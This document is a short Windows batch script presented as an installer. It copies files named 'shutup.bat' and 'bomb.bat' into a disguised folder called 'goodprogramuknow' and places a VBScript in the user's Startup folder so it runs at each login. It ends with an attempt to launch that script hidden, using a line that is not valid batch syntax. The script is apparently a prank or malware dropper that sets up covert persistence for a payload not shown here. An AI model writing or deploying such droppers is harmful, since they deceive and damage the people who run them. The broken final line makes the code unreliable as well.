@echo off
COLOR 0B

echo installing...

set shetupfolder=%CD%

set goodpr=C:%HOMEPATH%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

echo [for debugging]

echo installing from %shetupfolder%
echo to %goodpr%

echo [for debugging]


xcopy "%shetupfolder%\shutup.bat" C:\goodprogramuknow /I /Y
xcopy "%shetupfolder%\vbs2.vbs" "%goodpr%" /I /Y
xcopy "%shetupfolder%\bomb.bat" C:\goodprogramuknow /I /Y
echo finished

WShell.Run C:\%goodpr%\vbs2.vbs, 0
exit  